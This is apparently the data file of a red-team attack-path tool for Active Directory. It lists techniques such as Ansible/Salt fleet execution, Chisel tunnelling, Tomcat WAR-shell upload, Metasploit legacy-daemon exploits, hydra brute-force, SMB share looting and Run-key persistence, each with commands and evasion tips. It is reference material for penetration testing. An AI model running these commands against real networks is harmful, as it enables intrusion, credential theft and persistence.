    summary: 'Run commands fleet-wide via Ansible/Salt or an RMM suite.',
    description:
      "Configuration-management and remote-management platforms exist to run code on every node they manage, so turning one you control into estate-wide execution is the goal. From an Ansible controller, fire ad-hoc commands or a play against the whole inventory (as root via become); a Salt master publishes jobs to its minions over the ZeroMQ pub channel (4505/tcp); Puppet/Chef ship a malicious manifest/recipe. RMM and endpoint suites (PDQ Deploy, Tanium, ManageEngine, NinjaOne, Intune) deploy a package or script to all enrolled devices as SYSTEM. One controller = code execution everywhere, plus its stored deploy credentials.",
    tools: [
      { name: 'Ansible', url: 'https://www.ansible.com/' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Ansible: run as root across the inventory', code: r`ansible all -i inventory -m shell -a 'id' --become`, lang: 'bash' },
      { label: 'Salt: command every minion', code: r`salt '*' cmd.run 'whoami'`, lang: 'bash' },
    ],
    requires: ['Control of a config-management controller or RMM console (Ansible/Salt/Puppet, PDQ/Tanium/ManageEngine/Intune)'],
    mitre: mitre('T1072'),
    opsec: "Mass deployment is loud in the platform's own job / audit logs and lands on many hosts at once; target a subset. Commands spawn from the agent (as SYSTEM/root), a strong EDR signal.",
    references: [
      { label: 'Ansible, Introduction to ad-hoc commands', url: 'https://docs.ansible.com/ansible/latest/command_guide/intro_adhoc.html' },
    ],
  },
  {
    id: 'pivoting-tunneling',
    label: 'Pivoting & Tunneling',
    phase: 'lateral-movement',
    needs: 'shell',
    summary: 'Tunnel through a foothold to reach segmented internal networks.',
    description:
      "A compromised host is often routable to subnets you can't reach directly. Turn it into a pivot: a SOCKS proxy driven through proxychains, SSH local / remote / dynamic port-forwards, or a userland tunnel (Ligolo-ng, Chisel, sshuttle, Metasploit autoroute) to reach internal DCs, management VLANs, and services. This adds no privilege, only reach: the rest of the estate becomes available for enumeration and remote execution.",
    tools: [
      { name: 'Ligolo-ng', url: 'https://github.com/nicocha30/ligolo-ng' },
      { name: 'Chisel', url: 'https://github.com/jpillora/chisel' },
      { name: 'sshuttle', url: 'https://github.com/sshuttle/sshuttle' },
    ],
    commands: [
      { label: 'Dynamic SOCKS over SSH, then tunnel tooling', code: r`ssh -D 1080 user@pivot
proxychains nxc smb 172.16.5.0/24`, lang: 'bash' },
      { label: 'Reverse SOCKS with Chisel (NAT / firewall friendly)', code: r`# attacker
chisel server -p 8080 --reverse
# pivot
chisel client 10.0.0.66:8080 R:socks`, lang: 'bash' },
    ],
    requires: ['A foothold (shell) on a host with routes to the target network'],
    mitre: mitre('T1090.001'),
    opsec: 'Long-lived tunnels and unusual outbound connections from a server are detectable; userland tools (Ligolo-ng / Chisel) avoid dropping kernel drivers. Scope tunnels tightly and tear them down.',
    references: [
      { label: 'HackTricks, Tunneling & Port Forwarding', url: 'https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html' },
      { label: 'PayloadsAllTheThings, Network Pivoting Techniques', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/' },
    ],
  },
  {
    id: 'internal-web-apps',
    label: 'Internal Web App Attacks',
    phase: 'initial-access',
    needs: 'none',
    summary: 'Foothold via an exposed internal app: Jenkins, GitLab, Tomcat, Splunk…',
    description:
      "Internal networks are full of unhardened web apps that hand you a foothold or credentials with no domain account: CI/CD and dev tooling (Jenkins Groovy console → RCE, GitLab, Gitea, SonarQube), app servers (Tomcat / JBoss manager → deploy a WAR), monitoring / IT suites (Splunk, PRTG, Zabbix, osTicket), and CMSes (WordPress, Joomla, Drupal). Hunt default credentials, known CVEs, and admin consoles that allow code execution; these footholds frequently run as a service account or SYSTEM.",
    tools: [
      { name: 'Nuclei', url: 'https://github.com/projectdiscovery/nuclei' },
      { name: 'gquere, pwn_jenkins', url: 'https://github.com/gquere/pwn_jenkins' },
      { name: 'Metasploit', url: 'https://github.com/rapid7/metasploit-framework' },
    ],
    commands: [
      { label: 'Discover + template-scan internal web apps', code: r`nmap -p80,443,8080,8443,8000,8089 -oG - 172.16.5.0/24 | grep open
nuclei -l web_hosts.txt -severity critical,high`, lang: 'bash' },
      { label: 'Example: Tomcat manager → deploy a WAR shell', code: r`curl -u tomcat:tomcat -T shell.war "http://10.0.0.30:8080/manager/text/deploy?path=/x"`, lang: 'bash' },
    ],
    requires: ['Network reach to an internal web application (often surfaced during recon)'],
    mitre: mitre('T1190'),
    opsec: 'Credential brute-forcing and exploit traffic against internal apps are noisy; prefer default-credential checks and a single known-good exploit. App-server shells stand out as child processes of the web service.',
    references: [
      { label: 'HackTricks, Pentesting Web', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html' },
      { label: 'gquere, pwn_jenkins', url: 'https://github.com/gquere/pwn_jenkins' },
    ],
  },
  {
    id: 'weak-services',
    label: 'Weak / Legacy Services',
    phase: 'initial-access',
    needs: 'none',
    summary: 'Loot legacy protocols: FTP, Telnet, NFS, SNMP, rsync, VNC.',
    description:
      "Legacy and misconfigured services leak data, credentials, or a foothold with no domain account: anonymous or default-credential FTP / TFTP (config files, backups), cleartext Telnet / rlogin, NFS exports that are world-readable or set no_root_squash (read secrets, or write a SUID-root binary), SNMP public / private community strings (device configs and creds), rsync modules, and open VNC. Looted creds are as often local or app/service secrets as domain ones. Several of these daemons also carry known unauthenticated RCE (the vsftpd 2.3.4 backdoor, ProFTPd mod_copy CVE-2015-3306, Samba is_known_pipename), which drops a shell directly, often as root (vsftpd backdoor, SambaCry); privilege depends on the service account, so ProFTPd mod_copy typically lands as the unprivileged nobody user. Map them during recon and take the low-hanging fruit before touching AD.",
    tools: [
      { name: 'Nmap (NSE)', url: 'https://nmap.org/' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'Metasploit', url: 'https://github.com/rapid7/metasploit-framework' },
    ],
    commands: [
      { label: 'Anonymous FTP + NFS export hunting', code: r`ftp -nv 10.0.0.10   # try anonymous / anonymous
showmount -e 10.0.0.10 && mount -t nfs 10.0.0.10:/export /mnt`, lang: 'bash' },
      { label: 'SNMP community-string walk', code: r`onesixtyone -c communities.txt 10.0.0.0/24
snmpwalk -v2c -c public 10.0.0.10`, lang: 'bash' },
      { label: 'Known-CVE RCE in a legacy daemon (Metasploit)', code: r`msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor   # or unix/ftp/proftpd_modcopy_exec (CVE-2015-3306)`, lang: 'bash' },
    ],
    requires: ['Network reach to the legacy service (often anonymous / default-credential access)'],
    mitre: mitre('T1190'),
    opsec: 'Mostly low-noise reads; NFS mounts and SNMP sweeps are visible to network monitoring. High signal-to-effort against flat or legacy network segments.',
    references: [
      { label: 'HackTricks, Pentesting NFS', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html' },
      { label: 'HackTricks, Pentesting SNMP', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html' },
      { label: 'HackTricks, Pentesting FTP', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/index.html' },
      { label: 'scarybeastsecurity, Alert: vsftpd download backdoored (Chris Evans, CVE-2011-2523)', url: 'https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html' },
      { label: 'Exploit-DB, ProFTPd 1.3.5 mod_copy File Copy (Vadim Melihow, CVE-2015-3306)', url: 'https://www.exploit-db.com/exploits/36742' },
      { label: 'Samba, CVE-2017-7494 advisory (is_known_pipename RCE)', url: 'https://www.samba.org/samba/security/CVE-2017-7494.html' },
    ],
  },
  {
    id: 'anon-smb-shares',
    label: 'Anonymous / Guest SMB Shares',
    phase: 'initial-access',
    needs: 'none',
    summary: 'List and loot SMB shares that allow null-session or guest access.',
    description:
      "A null session (empty username and password) or the built-in Guest account often lists an SMB server's shares and grants read, sometimes write, to non-default ones (Public, Data, transfer, users$, backups). Read those straight off the wire for credentials, configs, scripts, unattend.xml / web.config, .kdbx / .ppk / .pem and backups; a writable anonymous share also lets you plant a coercion file (.lnk / .scf) to harvest NetNTLM. Looted creds are as often local or app secrets as domain ones. Modern Windows restricts anonymous access (RestrictAnonymous) and disables Guest by default, so this pays off most against file servers, NAS and Samba appliances, printers, and legacy hosts. The same IPC$ null session backs RID cycling for a user list.",
    tools: [
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'smbclient (Samba)', url: 'https://www.samba.org/samba/docs/current/man-html/smbclient.1.html' },
      { name: 'smbmap', url: 'https://github.com/ShawnDEvans/smbmap' },
    ],
    commands: [
      { label: 'List shares over a null / guest session', code: r`nxc smb 10.0.0.0/24 -u '' -p '' --shares      # null session
nxc smb 10.0.0.0/24 -u guest -p '' --shares`, lang: 'bash' },
      { label: 'Enumerate + connect anonymously (smbclient)', code: r`smbclient -N -L //10.0.0.10               # list shares, no creds
smbclient -N //10.0.0.10/Share`, lang: 'bash' },
      { label: 'Map read/write perms, then loot a share', code: r`smbmap -H 10.0.0.10 -u guest -p ''
smbclient -N //10.0.0.10/Share -c 'recurse ON; prompt OFF; mget *'`, lang: 'bash' },
    ],
    mitre: mitre('T1135'),
    references: [
      { label: 'NetExec Wiki, Enumerate shares & access', url: 'https://www.netexec.wiki/smb-protocol/enumeration/enumerate-shares-and-access' },
      { label: 'The Hacker Recipes, Network shares', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/network-shares' },
      { label: 'HackTricks, Pentesting SMB (139,445)', url: 'https://hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html' },
    ],
    requires: ['Network reach to SMB (445/139)', 'Null-session or Guest access permitted on the target'],
    opsec: 'Anonymous reads are low-noise, but share access is logged (5140/5145). RestrictAnonymous and the default-disabled Guest account block this on modern Windows, so a success usually means a file server, appliance, or legacy box.',
  },
  {
    id: 'online-brute',
    label: 'Online Password Brute-Force',
    phase: 'initial-access',
    needs: 'none',
    summary: 'Guess service logins live with hydra / medusa / nxc: SSH, FTP, RDP, HTTP, SMB.',
    description:
      'Where a login service is exposed and lockout is lax, guess credentials against it directly: hydra / medusa / ncrack / NetExec against SSH, FTP, Telnet, RDP, POP / IMAP / SMTP, HTTP forms and Basic auth, MSSQL / MySQL, and SMB. Seed it with an enumerated or OSINT username list and a targeted wordlist (rockyou, a mangled company list, vendor defaults). Against domain accounts prefer password spraying, which paces itself under the lockout threshold; online brute is best on local, appliance, and service logins with no lockout policy. A hit yields local, service, or domain credentials.',
    tools: [
      { name: 'hydra', url: 'https://github.com/vanhauser-thc/thc-hydra' },
      { name: 'medusa', url: 'https://github.com/jmk-foofus/medusa' },
      { name: 'ncrack', url: 'https://github.com/nmap/ncrack' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Brute SSH / FTP (hydra)', code: r`hydra -L users.txt -P rockyou.txt ssh://10.0.0.10
hydra -l admin -P pass.txt ftp://10.0.0.10`, lang: 'bash' },
      { label: 'Brute an HTTP login form', code: r`hydra -l admin -P pass.txt 10.0.0.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"`, lang: 'bash' },
      { label: 'Protocol brute over NetExec', code: r`nxc ssh 10.0.0.10 -u users.txt -p pass.txt`, lang: 'bash' },
    ],
    requires: ['A reachable authentication service', 'Lax or absent account-lockout policy (otherwise spray instead)'],
    mitre: mitre('T1110.001'),
    references: [
      { label: 'HackTricks, Brute Force', url: 'https://book.hacktricks.wiki/en/generic-hacking/brute-force.html' },
    ],
    opsec: 'Noisy: each attempt is a failed logon (4625 / auth.log) and can trip account lockout, unlike spraying. Throttle, prefer a small targeted list, and confirm there is no lockout policy before hammering domain accounts.',
  },
  {
    id: 'host-persistence',
    label: 'Host Persistence',
    phase: 'persistence',
    needs: 'local-admin',
    summary: 'Survive reboot on a foothold: run keys, tasks, services, WMI subs.',
    description:
      "Keep access to a compromised host independent of the domain: registry Run / RunOnce keys, a scheduled task, a new or hijacked Windows service, a WMI permanent event subscription (fires on a trigger, often as SYSTEM), COM hijacking, or a startup-folder shortcut. Each mechanism maps to its own ATT&CK sub-technique beyond the tagged T1547 (Run keys / startup folder): scheduled tasks are T1053.005, services T1543.003, WMI event subscriptions T1546.003, and COM hijacking T1546.015. These host-local footholds survive reboot and password resets and are cheap to plant; pair them with domain persistence (golden ticket, AdminSDHolder, …) for layered resilience.",
    tools: [
      { name: 'SharPersist', url: 'https://github.com/mandiant/SharPersist' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Registry Run key + scheduled task', code: r`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /d "C:\Windows\Temp\b.exe"
schtasks /create /tn Updater /tr "C:\Windows\Temp\b.exe" /sc onlogon`, lang: 'cmd' },
      { label: 'Auto-start Windows service', code: r`sc create Updater binPath= "C:\Windows\Temp\b.exe" start= auto
sc start Updater`, lang: 'cmd' },
    ],
    requires: ['Local admin / SYSTEM on the host (user-level Run keys need only the user)'],
    mitre: mitre('T1547'),
    opsec: 'Autoruns, services (7045) and scheduled tasks (4698) are classic, well-monitored persistence; WMI event subscriptions and COM hijacks are quieter and fileless but Sysmon / EDR increasingly catch them. Blend names with legitimate software.',
    references: [
      { label: 'PayloadsAllTheThings, Windows Persistence', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/windows-persistence/' },
      { label: 'persistence-info.github.io, Windows persistence catalog', url: 'https://persistence-info.github.io/' },
    ],
  },
];

export const adCoverageEdges: AttackEdge[] = [
  // Credential dumping additions (under local-admin-host → ad-cat-cred-dump)
  { source: 'domain-admin', target: 'ntds-dump', label: 'loot DC database' },
  { source: 'ntds-dump', target: 'krbtgt-hash', label: 'krbtgt hash' },
  { source: 'ntds-dump', target: 'pass-the-hash', label: 'all NT hashes' },
  { source: 'dpapi-domain-backupkey', target: 'dpapi-user-secrets', label: 'decrypt any masterkey' },
  { source: 'dpapi-user-secrets', target: 'lateral-movement-cme', label: 'recovered creds' },
  { source: 'wdigest-downgrade', target: 'dump-lsass', label: 'cleartext after logon' },

  // No-cred / poisoning additions
  { source: 'ad-cat-noauth', target: 'timeroast', description: 'Indicators this path applies: a DC is reachable on UDP/123 (nmap -sU -p123 shows it open); recovered hashes are formatted $sntp-ms$<mac>$<salt> (hashcat mode 31300); output lines are keyed RID:hash for computer ($) and trust accounts.' },
  { source: 'timeroast', target: 'crack-hash-offline', label: 'computer acct hash' },
  { source: 'ad-cat-poisoning', target: 'arp-poisoning' },
  { source: 'arp-poisoning', target: 'ntlm-relay' },
  { source: 'arp-poisoning', target: 'crack-netntlm' },
  { source: 'ad-cat-coercion', target: 'adidns-spoofing', description: 'Indicators this path applies: AD-integrated DNS zone (ms-DNS-Node objects in CN=MicrosoftDNS,DC=DomainDnsZones); Authenticated Users / create child ACE on the dnsZone object (default); a hostname an automation/script/linked-server resolves but that has no static record yet.' },
  { source: 'adidns-spoofing', target: 'ntlm-relay' },
  { source: 'adidns-spoofing', target: 'crack-netntlm' },

  // Credential access additions
  { source: 'ad-cat-credaccess', target: 'unpac-the-hash', description: 'Indicators this path applies: a usable PFX or cert+key for a domain or machine account is in hand (often from ESC1/ESC8/Shadow-Credentials/Certifried); certipy auth or Rubeus asktgt /getcredentials returns a TGT plus the account NT hash; the DC supports PKINIT (holds a Domain Controller Authentication certificate).' },
  { source: 'pass-the-certificate', target: 'unpac-the-hash', label: 'PKINIT TGT' },
  { source: 'shadow-credentials', target: 'unpac-the-hash', label: 'PKINIT TGT' },
  { source: 'unpac-the-hash', target: 'pass-the-hash', label: 'recovered NT hash' },
  { source: 'coerced-auth', target: 'webclient-coercion', label: 'over HTTP' },
  { source: 'webclient-coercion', target: 'ntlm-relay' },
  { source: 'webclient-coercion', target: 'adcs-esc8', label: 'relay to web enroll' },
  // (webclient-coercion -> rbcd removed: redundant rank-skip:
  //  webclient-coercion -> ntlm-relay -> relay-to-ldap -> rbcd already covers it.)

  // Delegation additions
  { source: 'constrained-delegation', target: 'bronze-bit', label: 'force forwardable' },
  { source: 'bronze-bit', target: 'pass-the-ticket' },
  { source: 'machineaccountquota-abuse', target: 'rbcd', label: 'attacker computer' },
  { source: 'machineaccountquota-abuse', target: 'shadow-credentials', label: 'controlled principal' },
  { source: 'machineaccountquota-abuse', target: 'nopac' },

  // DACL + privileged groups (logon-script-abuse now hangs off acl-tgt-user, in ad-additions.ts)
  { source: 'logon-script-abuse', target: 'lateral-movement-cme', label: 'exec as target' },

  // Persistence + Exchange + CVEs
  { source: 'persist-forgery', target: 'goldengmsa' },
  { source: 'domain-admin', target: 'goldengmsa', label: 'read KDS root key' },
  { source: 'goldengmsa', target: 'pass-the-hash', label: 'forged gMSA hash' },
  { source: 'ad-cat-quick-compromise', target: 'proxylogon' },
  { source: 'proxylogon', target: 'local-admin-host', label: 'webshell -> SYSTEM' },
  { source: 'cvegrp-exchange', target: 'proxynotshell' },
  { source: 'proxynotshell', target: 'local-admin-host', label: 'RCE on Exchange' },

  // --- Coverage additions (2026-06): local cred hunting, browser creds, AS-REP, MSSQL exec, TGT harvest, NTLMv1
  { source: 'local-admin-host', target: 'local-cred-hunt', description: 'Indicators this path applies: readable SAM/SECURITY/SYSTEM registry hives (local hashes, LSA secrets, cached domain creds); LSASS accessible for credential extraction; DPAPI masterkeys and Credential Manager vaults; browser credential stores; SSH private keys, Kerberos keytabs/ccaches; unattend.xml, app config files, and service-account passwords left on disk.' },
  { source: 'local-cred-hunt', target: 'valid-domain-creds', label: 'found creds' },
  { source: 'local-admin-host', target: 'browser-creds' },
  { source: 'browser-creds', target: 'valid-domain-creds', label: 'saved logins' },
  { source: 'targeted-asrep', target: 'crack-hash-offline', label: 'AS-REP hash' },
  { source: 'ad-cat-mssql', target: 'mssql-exec' },
  // xp_cmdshell runs as the SQL Server SERVICE account, not SYSTEM: usually a
  // virtual/managed account (with SeImpersonate → potato → SYSTEM) or a domain
  // service account, sometimes LocalSystem. Land as that account, then escalate.
  { source: 'mssql-exec', target: 'user-foothold', label: 'as the SQL service account' },
  { source: 'mssql-exec', target: 'local-admin-host', label: 'if SQL runs as SYSTEM' },
  { source: 'local-admin-host', target: 'tgt-harvest' },
  { source: 'tgt-harvest', target: 'pass-the-ticket', label: 'harvested TGT' },
  { source: 'llmnr-poisoning', target: 'ntlmv1-downgrade', label: 'NTLMv1' },
  { source: 'coerced-auth', target: 'ntlmv1-downgrade', label: 'NTLMv1' },
  { source: 'ntlmv1-downgrade', target: 'pass-the-hash', label: 'recovered NT hash' },

  // --- NTLM reflection / BitLocker / gMSA-membership-write
  { source: 'cvegrp-kerberos', target: 'ntlm-reflection' },
  { source: 'ntlm-reflection', target: 'local-admin-host', label: 'reflect → SYSTEM' },
  { source: 'domain-object-enum', target: 'bitlocker-recovery', description: 'Indicators this path applies: enumeration surfaces msFVE-RecoveryInformation objects you can actually READ (a delegated or over-permissive ACL on the computer object or its BitLocker recovery info), not merely that BitLocker is deployed. Without that read right this is "identify delegated recovery-key readers", not extraction.' },
  { source: 'bitlocker-recovery', target: 'ntds-dump', label: 'decrypt offline DC' },

  // --- AD long-tail (2026-06): Linux host secrets + machine-scoped DPAPI
  { source: 'ad-cat-host-dump', target: 'linux-host-secrets' },
  { source: 'linux-host-secrets', target: 'pass-the-hash', label: 'keytab → NT/AES hash' },
  { source: 'linux-host-secrets', target: 'pass-the-ticket', label: 'reuse ccache' },
  { source: 'ad-cat-host-dump', target: 'dpapi-machine-secrets' },
  { source: 'dpapi-machine-secrets', target: 'valid-domain-creds', label: 'recovered creds' },
  { source: 'dpapi-machine-secrets', target: 'pass-the-certificate', label: 'machine cert key' },

  // --- Linux loot/lateral, DevOps creds, JEA endpoint breakout (2026-06)
  { source: 'local-admin-host', target: 'linux-cred-hunt' },
  { source: 'linux-cred-hunt', target: 'valid-domain-creds', label: 'recovered creds' },
  { source: 'local-admin-host', target: 'ssh-hijack' },
  { source: 'ssh-hijack', target: 'user-foothold', label: 'shell as the hijacked user', rel: 'host-exec' },
  { source: 'local-admin-host', target: 'devops-secrets' },
  { source: 'devops-secrets', target: 'valid-domain-creds', label: 'deploy/admin creds' },
  // JEA remoting is a remote-access transport (grouped with the reverse shell): authenticate
  // to a constrained endpoint, break out to the RunAs identity, land on the host.
  { source: 'lat-cat-shell', target: 'jea-breakout' },
  { source: 'jea-breakout', target: 'lat-host-foothold', label: 'breakout → shell', rel: 'host-exec' },
  { source: 'jea-breakout', target: 'domain-admin', label: 'if the JEA endpoint is on a DC' },
  // Deployment Platform Abuse umbrella: Splunk + config-mgmt/RMM (SCCM & WSUS live in their own branches)
  { source: 'ad-cat-deploy-abuse', target: 'splunk-abuse' },
  { source: 'splunk-abuse', target: 'local-admin-host', label: 'SYSTEM on forwarders', rel: 'host-exec' },
  { source: 'ad-cat-deploy-abuse', target: 'config-mgmt-abuse' },
  { source: 'config-mgmt-abuse', target: 'local-admin-host', label: 'exec on managed hosts', rel: 'host-exec' },
  // Pivoting & tunneling: reach segmented internal networks from a foothold
  { source: 'ad-cat-lateral', target: 'pivoting-tunneling' },
  { source: 'pivoting-tunneling', target: 'lateral-movement-cme', label: 'reach internal hosts' },
  // No-cred footholds now grouped under the 'Exposed Services & Apps' category
  // (ad-cat-services, in ad-categories.ts) so they don't dangle off network-recon.
  { source: 'ad-cat-services', target: 'internal-web-apps' },
  // App/web RCE lands you as the app-pool / service identity (often a low-priv or
  // domain service account). NOT necessarily local admin. Route through the
  // user-context foothold; a direct SYSTEM only when the app runs as LocalSystem
  // (Jenkins/Splunk/Tomcat services often do).
  { source: 'internal-web-apps', target: 'user-foothold', label: 'RCE as the app / service account', rel: 'host-exec' },
  { source: 'internal-web-apps', target: 'local-admin-host', label: 'if running as SYSTEM', rel: 'host-exec' },
  { source: 'ad-cat-services', target: 'weak-services' },
  // Weak/legacy services fork like the web-app branch: they LEAK creds (domain, or
  // as often local / app secrets) AND can hand you code execution (an interactive
  // login, or unauthenticated CVE RCE, usually as the privileged daemon account).
  { source: 'weak-services', target: 'valid-domain-creds', label: 'looted domain creds' },
  { source: 'weak-services', target: 'valid-local-creds', label: 'looted local / app creds' },
  { source: 'weak-services', target: 'user-foothold', label: 'shell / RCE (service account)', rel: 'host-exec' },
  { source: 'weak-services', target: 'local-admin-host', label: 'RCE as root / SYSTEM', rel: 'host-exec' },
  // Anonymous / guest SMB shares: the classic no-cred easy-win. Reading a
  // world/guest-readable share leaks creds (domain, or as often local / app secrets);
  // it is loot, not an exec primitive, so it converges on the credential hubs only.
  { source: 'ad-cat-services', target: 'anon-smb-shares' },
  { source: 'anon-smb-shares', target: 'valid-domain-creds', label: 'looted domain creds' },
  { source: 'anon-smb-shares', target: 'valid-local-creds', label: 'looted local / app creds' },
  // Online brute-force of an exposed login service: guessing, not spraying. Yields
  // local/service creds most often, domain creds where lockout is lax.
  { source: 'ad-cat-services', target: 'online-brute' },
  { source: 'online-brute', target: 'valid-local-creds', label: 'guessed local / service login' },
  { source: 'online-brute', target: 'valid-domain-creds', label: 'guessed domain login' },
  // Host-local persistence: maintain a foothold (CRTO "Host Persistence"); terminal
  { source: 'local-admin-host', target: 'host-persistence', label: 'maintain access' },

  // Any captured credential / ticket / token can belong to a Domain Admin, so the
  // credential-capture nodes each carry a (conditional) SHORTCUT straight to DA. A
  // privileged user logged on / their secret stored here = instant Domain Admin.
  // The creds you ALREADY hold can be a DA's too (sprayed/cracked/relayed/kerberoasted
  // a DA account), so the domain-creds hub itself offers the same shortcut.
  { source: 'valid-domain-creds', target: 'domain-admin', label: 'if the creds are a DA' },
  { source: 'dump-lsass', target: 'domain-admin', label: 'if a DA is logged on' },
  { source: 'sam-lsa-dump', target: 'domain-admin', label: 'cached / LSA DA creds' },
  { source: 'tgt-harvest', target: 'domain-admin', label: "a DA's TGT" },
  { source: 'rdp-session-hijack', target: 'domain-admin', label: 'hijack a DA session' },
  { source: 'koh-token-theft', target: 'domain-admin', label: "steal a DA's token" },
  { source: 'dpapi-user-secrets', target: 'domain-admin', label: "a DA's saved creds" },
  { source: 'local-cred-hunt', target: 'domain-admin', label: 'DA creds on disk' },
  // Linux loot (SSH keys, krb5 ccache/keytab, config secrets) can equally be a DA's.
  { source: 'linux-cred-hunt', target: 'domain-admin', label: "a DA's keys / ticket" },
  { source: 'browser-creds', target: 'domain-admin', label: 'saved DA creds' },
  { source: 'app-config-secrets', target: 'domain-admin', label: 'stored DA creds' },
  { source: 'devops-secrets', target: 'domain-admin', label: 'DA deploy account' },
];
